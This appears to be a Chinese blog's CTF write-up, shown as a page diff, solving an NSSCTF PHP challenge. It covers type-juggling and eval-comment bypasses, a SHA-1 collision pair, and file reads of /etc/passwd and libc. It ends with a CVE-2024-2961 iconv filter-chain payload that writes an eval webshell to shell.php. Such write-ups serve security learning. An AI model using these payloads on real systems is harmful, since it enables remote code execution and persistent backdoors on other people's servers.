@@ -17,7 +17,7 @@
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://csd0617.github.io';</script>
   
   <title>
-    ISCTF小蓝鲨的冒险 |
+    NSSCTF Round#30 小桃的PHP挑战 |
     
     达达
   </title>
@@ -32,20 +32,29 @@
 
   
   
-    <meta name="description" content="get传参b&#x3D;a[0]&#x3D;QLTHNDT md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头 因为PHP 试图解析它们为数值，发现它们符合 0eX（科学计数法），都被解释为 **0 * 10^X &#x3D; 0**。 结果是 0 &#x3D;&#x3D; 0，所以 **返回 true**。 然后post  num num&#x3D;2024  不能有字母">
+    <meta name="description" content="第一关 isset($_GET[&#39;one&#39;]) ✅ 为真 $str &#x3D; &#39;9&#39; $add &#x3D; substr(&#39;9&#39;, 0, 1) → &#39;9&#39; $add++ → &#39;10&#39; strlen($add) &#x3D; 2 &gt; 1 → ✅ 条件成立 执行 $A &#x3D; 1;，不会执行 echo  ✅ 所以：**传 **?one&#x3D;1&amp;a">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ISCTF小蓝鲨的冒险">
-<meta property="og:url" content="http://csd0617.github.io/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/index.html">
+<meta property="og:title" content="NSSCTF Round#30 小桃的PHP挑战">
+<meta property="og:url" content="http://csd0617.github.io/2025/04/06/NSSRound#30/index.html">
 <meta property="og:site_name" content="达达">
-<meta property="og:description" content="get传参b&#x3D;a[0]&#x3D;QLTHNDT md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头 因为PHP 试图解析它们为数值，发现它们符合 0eX（科学计数法），都被解释为 **0 * 10^X &#x3D; 0**。 结果是 0 &#x3D;&#x3D; 0，所以 **返回 true**。 然后post  num num&#x3D;2024  不能有字母">
+<meta property="og:description" content="第一关 isset($_GET[&#39;one&#39;]) ✅ 为真 $str &#x3D; &#39;9&#39; $add &#x3D; substr(&#39;9&#39;, 0, 1) → &#39;9&#39; $add++ → &#39;10&#39; strlen($add) &#x3D; 2 &gt; 1 → ✅ 条件成立 执行 $A &#x3D; 1;，不会执行 echo  ✅ 所以：**传 **?one&#x3D;1&amp;a">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://csd0617.github.io/picture/image-20250330101955635.png">
-<meta property="og:image" content="http://csd0617.github.io/picture/image-20250330104552398.png">
-<meta property="article:published_time" content="2025-03-30T02:56:00.000Z">
-<meta property="article:modified_time" content="2025-03-31T11:18:24.732Z">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406150804182.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406154125134.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406154256537.png">
+<meta property="og:image" content="c:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250406154512635.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406154651249.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406154922140.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406155151129.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406155205395.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406155249538.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406155327546.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250406160009741.png">
+<meta property="article:published_time" content="2025-04-06T08:00:22.878Z">
+<meta property="article:modified_time" content="2025-04-06T14:02:27.902Z">
 <meta property="article:author" content="达达">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250330101955635.png">
+<meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250406150804182.png">
   
   
     <link rel="alternate" href="/atom.xml" title="达达" type="application/atom+xml">
@@ -178,7 +187,7 @@
 <header id="header">
   
     <picture></picture>
-    <img  fetchpriority="high" src="/../covers/2.jpg" alt="ISCTF小蓝鲨的冒险">
+    <img  fetchpriority="high" src="/../covers/3.jpg" alt="NSSCTF Round#30 小桃的PHP挑战">
   
   <div id="header-outer">
     <div id="header-title">
@@ -186,7 +195,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">ISCTF小蓝鲨的冒险</h1>
+            <h1 data-aos="slide-up">NSSCTF Round#30 小桃的PHP挑战</h1>
           </a>
         
       
@@ -213,7 +222,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AACVE-2024-2961%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">下面就是一个CVE-2024-2961漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96-proc-self-maps%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">读取&#x2F;proc&#x2F;self&#x2F;maps文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96libc%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">读取libc文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E7%94%9F%E6%88%90payload"><span class="toc-number">4.3.</span> <span class="toc-text">使用脚本生成payload</span></a></li></ol></li></ol>
       
   </div>
 </div>
@@ -297,13 +306,13 @@
   
 </aside>
 
-          <section id="main"><article id="post-小蓝鲨的冒险" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-NSSRound#30" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
-    <time datetime="2025-03-30T02:56:00.000Z" itemprop="datePublished">2025-03-30</time>
-    <time style="display: none;" id="post-update-time">2025-03-31</time>
+    <time datetime="2025-04-06T08:00:22.878Z" itemprop="datePublished">2025-04-06</time>
+    <time style="display: none;" id="post-update-time">2025-04-06</time>
   </span>
 </div>
 
@@ -316,38 +325,60 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p><img src="/../picture/image-20250330101955635.png" alt="image-20250330101955635"></p>
-<p><strong>get传参b&#x3D;a[0]&#x3D;QLTHNDT</strong></p>
-<p>md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头</p>
-<p>因为<strong>PHP 试图解析它们为数值</strong>，发现它们符合 <code>0eX</code>（科学计数法），都被解释为 **<code>0 * 10^X = 0</code>**。</p>
-<p>结果是 <code>0 == 0</code>，所以 **返回 <code>true</code>**。</p>
-<p>然后post  num</p>
-<p>num&#x3D;2024  不能有字母    intval($num,0)&#x3D;2024</p>
-<p>小数点绕过即可   </p>
-<p><strong>post传参num&#x3D;2024.1</strong></p>
-<p>intval() 转换小数类型时，只返回个位数，不遵循四舍五入的原则。</p>
-<p>接下来是一个switch循环   </p>
-<p><strong>get传参  which&#x3D;flag</strong></p>
-<p>在 PHP 中，<code>switch</code> 语句的比较是通过 <strong>严格比较（&#x3D;&#x3D;）</strong> 来进行的。当你传递一个非数字字符串（例如 <code>&quot;flag&quot;</code>）时，PHP 会<strong>尝试将其转换为数字</strong>。这个转换过程有些特殊，通常会把任何非数字字符串转换为 **<code>0</code>**。</p>
-<p>也就是</p>
-<ul>
-<li>PHP 会自动尝试将 <code>&quot;flag&quot;</code> 转换为数字。在 PHP 中，<strong>任何非数字字符串</strong>（例如 <code>&quot;flag&quot;</code>）都会被转换为数字 <code>0</code>。</li>
-<li>因此，<code>switch(&quot;flag&quot;)</code> 会变成 <code>switch(0)</code>，然后与 <code>case 0</code> 进行匹配。</li>
-<li>结果会进入 <code>case 0</code> 分支，并执行 <code>print(&#39;QAQ&#39;);</code>，然后因为没有 <code>break</code>，会继续执行后面的 <code>case</code>1  csae2 语句。</li>
+        <p><img src="/../picture/image-20250406150804182.png" alt="image-20250406150804182"></p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><ul>
+<li><code>isset($_GET[&#39;one&#39;])</code> ✅ 为真</li>
+<li><code>$str = &#39;9&#39;</code></li>
+<li><code>$add = substr(&#39;9&#39;, 0, 1)</code> → <code>&#39;9&#39;</code></li>
+<li><code>$add++</code> → <code>&#39;10&#39;</code></li>
+<li><code>strlen($add) = 2</code> &gt; 1 → ✅ 条件成立</li>
+<li>执行 <code>$A = 1;</code>，不会执行 echo</li>
 </ul>
-<p><strong>为什么要传  flag呢？</strong></p>
-<p><code>require_once</code> 会将指定的文件包含到当前文件中，从而使得该文件中的代码能够在当前文件中使用。</p>
-<p>require_once（）也就是一个文件包含函数    与include类似（这里也就是一个文件包含漏洞）</p>
-<p><strong><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</strong></p>
-<p><strong>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</strong></p>
-<p>而传flag的原因就是   </p>
-<p>该目录下有flag.php这个文件   可以使用require_once进行文件包含  而不报错   从而执行echo  flag这条命令</p>
-<p><strong>为什么只有flag.php才能输出flag   而index.php等其他文件不能呢</strong>？</p>
-<p>因为$flag  这个变量只在flag.php文件下存在   只有将flag.php包含  才能正确输出来$flag变量的内容</p>
-<p>所以这里的payload为</p>
-<p>get  ：  ?b&#x3D;a[0]&#x3D;QLTHNDT&amp;which&#x3D;flag</p>
-<p>post:     num&#x3D;2024.1</p>
-<p><img src="/../picture/image-20250330104552398.png" alt="image-20250330104552398"></p>
+<p>✅ 所以：**传 <code>**?one=1&amp;str=9**</code>，会使$A&#x3D;1</p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>先传一个two&#x3D;1</p>
+<p>🚫 黑名单限制：</p>
+<ul>
+<li>禁止：<code>;</code>、空格、<code>$</code>、<code>#</code>、反引号、单双引号、星号、问号、尖括号、换行、<code>^</code> 等等。</li>
+</ul>
+<p>这里的$B&#x3D;1 在  if 的 try  里</p>
+<p>只要我们能进入if循环的try里即可</p>
+<p>这里我们只需要注释一下就行  直接传  *<em>comment&#x3D;&#x2F;<em>或者&#x2F;&#x2F;都可以</em></em></p>
+<p>然后try里就会是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;$B = 1;&#x27;./*.&#x27;;echo $two;die();&#x27;); </span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;*会把后面的都给注释掉  但似乎并不会影响下一层  if  的检查与传参</p>
+<p>&#x2F;&#x2F;这一行后面的给注释掉</p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>还是先传一个three&#x3D;1</p>
+<p>这里是sha1的强碰撞   </p>
+<p>去网上查一下    这里用burpsuite   hackbar应该是传不上的</p>
+<p>传one&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;two&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>
+<p>传上去之后用file读取一下&#x2F;etc&#x2F;passwd看看有没有成功</p>
+<p>&amp;file&#x3D;&#x2F;etc&#x2F;passwd</p>
+<p><img src="/../picture/image-20250406154125134.png" alt="image-20250406154125134"></p>
+<h2 id="下面就是一个CVE-2024-2961漏洞"><a href="#下面就是一个CVE-2024-2961漏洞" class="headerlink" title="下面就是一个CVE-2024-2961漏洞"></a>下面就是一个CVE-2024-2961漏洞</h2><h3 id="读取-proc-self-maps文件"><a href="#读取-proc-self-maps文件" class="headerlink" title="读取&#x2F;proc&#x2F;self&#x2F;maps文件"></a>读取&#x2F;proc&#x2F;self&#x2F;maps文件</h3><p><img src="/../picture/image-20250406154256537.png" alt="image-20250406154256537"></p>
+<p>将其保存为maps</p>
+<p>找到libc文件的位置</p>
+<p><img src="C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250406154512635.png" alt="image-20250406154512635"></p>
+<h3 id="读取libc文件"><a href="#读取libc文件" class="headerlink" title="读取libc文件"></a>读取libc文件</h3><p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so</p>
+<p><img src="/../picture/image-20250406154651249.png" alt="image-20250406154651249"></p>
+<p>将得到的内容base64解码，保存为libc.so</p>
+<p><img src="/../picture/image-20250406154922140.png" alt="image-20250406154922140"></p>
+<h3 id="使用脚本生成payload"><a href="#使用脚本生成payload" class="headerlink" title="使用脚本生成payload"></a>使用脚本生成payload</h3><p>脚本网址：<a target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv">https://github.com/kezibei/php-filter-iconv</a></p>
+<p>将<code>maps</code>和<code>libc.so</code>放入该py脚本的同目录文件夹下</p>
+<p>修改python脚本的cmd命令和libc文件名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;echo &#x27;&lt;?php @eval($_POST[\&quot;cmd\&quot;]); ?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250406155151129.png" alt="image-20250406155151129"></p>
+<p><img src="/../picture/image-20250406155205395.png" alt="image-20250406155205395"></p>
+<p>运行脚本生成payload</p>
+<p><img src="/../picture/image-20250406155249538.png" alt="image-20250406155249538"></p>
+<p>payload：</p>
+<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1&#x2F;resource&#x3D;data:text&#x2F;plain;base64,e3vXsO%2bxmQhbwlV%2bS57U03I7AybOlZ3uuE7hTdB1j8lay0%2blFvXbdG3mmBDCqOYg9sdO4L9wbuOkPxzbtVgZ8IIGxTOf5dJ3zln6JXLnkbBTJts8zDjw6zig8Kyyf3PMuaBfa2KStFOlolWkWfDrSBD4vOd4pF66Zm2Y3sapRr26k3iZ8Otw3nkue85SkKM03&#x2F;J%2byI059ftge7&#x2F;89bVnbmfL7c87ffvbpz&#x2F;r9UxORJz7Ul13oePJe0YCnvy&#x2F;u7ozLC9bv3bbmo22p8NOfYvY9unOtO1vn95cZpmXWl19%2b9rz%2b&#x2F;bxxvL&#x2F;bewnxUviN%2bzf1NfXP7M%2bub7%2bOfeJ9fG&#x2F;3nh3vn2662789t9re6dvij1VNnf76%2bVlBf%2b33JV&#x2F;vn19btXPPbHyzw9euhc0L7ky5&#x2F;Snt09iFKdHbf&#x2F;92eZ56u59edfTo43t32jrP8&#x2F;U&#x2F;&#x2F;7Wbn72uudB54tXnnlddjpzXZnl9F977k4vq&#x2F;m9J1buffhJ1vX5uR&#x2F;L&#x2F;pTFvfi578HppzZ1lfKVd9btnvN6z7z4r7d311Yv2r7&#x2F;3VqJY%2bWWSj%2brmfF7QuKYzfrCaUXTLqUvPWKyyb7ut%2bmktwQC0aH8zcSNKVduJfVmCkz8Ik8gxN&#x2F;dUE4%2buWLrUanLCkov7fErZri70f3YpMDsbtNlji6X6gko3pXc36O6%2bJpYtk9zx5L&#x2F;BBSXHJeT9HZbq3ttBpug538CPnzRZ2s0rScqeo0hr9KkfwRC8IJsdYqO5NZtEclSLip&#x2F;2fErXmD97USEUVbuxmMmHR6&#x2F;%2bEcDejSgyQ3ow7O9OyfKlb&#x2F;z&#x2F;&#x2F;0itU9zUi4B5QZ7dk6ReFn4&#x2F;N%2bW&#x2F;rhnM5RuslHZ%2bDU71xROE7p&#x2F;Off%2bp7LkXwL2&#x2F;vv&#x2F;f7isf1lEcBuBaD2w4dmmY5FeNf7ba7UNazd0bJAlYFWb6XTTc0GPqne9je582ex6ZD4A</p>
+<p>发包</p>
+<p><img src="/../picture/image-20250406155327546.png" alt="image-20250406155327546"></p>
+<p>然后用yijian连接</p>
+<p>flag在这个文件夹下</p>
+<p><img src="/../picture/image-20250406160009741.png" alt="image-20250406160009741"></p>
 
       
     </div>
@@ -357,8 +388,8 @@
       
       
       
-        <a data-aos="zoom-in" href="/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/#comments" class="article-comment-link">
-          <span class="post-comments-count waline-comment-count" data-path="/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/" itemprop="commentCount"></span>
+        <a data-aos="zoom-in" href="/2025/04/06/NSSRound#30/#comments" class="article-comment-link">
+          <span class="post-comments-count waline-comment-count" data-path="/2025/04/06/NSSRound#30/" itemprop="commentCount"></span>
           留言
         </a>
       
@@ -366,7 +397,7 @@
       
       
         <span data-aos="zoom-in" class="article-visitor-link">
-          <span class="waline-pageview-count" data-path="/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/">0</span>
+          <span class="waline-pageview-count" data-path="/2025/04/06/NSSRound#30/">0</span>
           <em class="post-meta-item-text">阅读量</em>
         </span>
       
@@ -377,31 +408,20 @@
   
   <nav id="article-nav" data-aos="fade-up">
     
-      
-      <div class="article-nav-link-wrap article-nav-link-left">
-        
-          <img data-src="/../covers/4.jpg" data-sizes="auto" alt="ISCTF 千年樱" class="lazyload">
-        
-        <a href="/2025/03/31/ISCTF%20%20%E5%8D%83%E5%B9%B4%E6%A8%B1/"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-          
-            ISCTF 千年樱
-          
-        </h3>
-      </div>
-    
     
     
     <div class="article-nav-link-wrap article-nav-link-right">
       
-        <img data-src="/../covers/3.jpg" data-sizes="auto" alt="NSSRound#28 Team ez_php" class="lazyload">
+        
+        
+          <img data-src="/covers/4.jpg" data-sizes="auto" alt="" class="lazyload">
+        
       
-      <a href="/2025/03/27/NSSRound%20Teamez_php/"></a>
+      <a href="/2025/04/01/php%E6%AD%BB%E4%BA%A1exit()%E7%BB%95%E8%BF%87/"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
         
-          NSSRound#28 Team ez_php
+          (no title)
         
       </h3>
     </div>
@@ -479,7 +499,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AACVE-2024-2961%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">下面就是一个CVE-2024-2961漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96-proc-self-maps%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">读取&#x2F;proc&#x2F;self&#x2F;maps文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96libc%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">读取libc文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E7%94%9F%E6%88%90payload"><span class="toc-number">4.3.</span> <span class="toc-text">使用脚本生成payload</span></a></li></ol></li></ol>
       
   </div>
 </div>
@@ -626,14 +646,14 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "达达",
-          title: "ISCTF小蓝鲨的冒险",
-          url: "http://csd0617.github.io/2025/03/30/%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E5%86%92%E9%99%A9/",
+          title: "NSSCTF Round#30 小桃的PHP挑战",
+          url: "http://csd0617.github.io/2025/04/06/NSSRound#30/",
           excerpt: "",
           description: "",
-          stripContent: " get传参b&amp;#x3D;a[0]&amp;#x3D;QLTHNDT md5弱比较  这里是0e绕过    QNKCDZO与QLTHNDT经过md5编码后都是0e开头 因为PHP 试图解析它们为数值，发现它们符合 0eX（科学计数法），都被解释为 **0 * 10^X = 0**。 结果是 0 == 0，所以 **返回 true**。 然后post  num num&amp;#x3D;2024  不能有字母    intval($num,0)&amp;#x3D;2024 小数点绕过即可    post传参num&amp;#x3",
-          date: "Sun Mar 30 2025 10:56:00 GMT+0800",
-          updated: "Mon Mar 31 2025 19:18:24 GMT+0800",
-          cover: "/../covers/2.jpg",
+          stripContent: " 第一关 isset($_GET[&amp;#39;one&amp;#39;]) ✅ 为真 $str = &amp;#39;9&amp;#39; $add = substr(&amp;#39;9&amp;#39;, 0, 1) → &amp;#39;9&amp;#39; $add++ → &amp;#39;10&amp;#39; strlen($add) = 2 &amp;gt; 1 → ✅ 条件成立 执行 $A = 1;，不会执行 echo  ✅ 所以：**传 **?one=1&amp;amp;str=9**，会使$A&amp;#x3D;1 第二关先传一个two&amp;#x3D;1 🚫 黑名单限制：",
+          date: "Sun Apr 06 2025 16:00:22 GMT+0800",
+          updated: "Sun Apr 06 2025 22:02:27 GMT+0800",
+          cover: "/../covers/3.jpg",
         };
       </script>
        
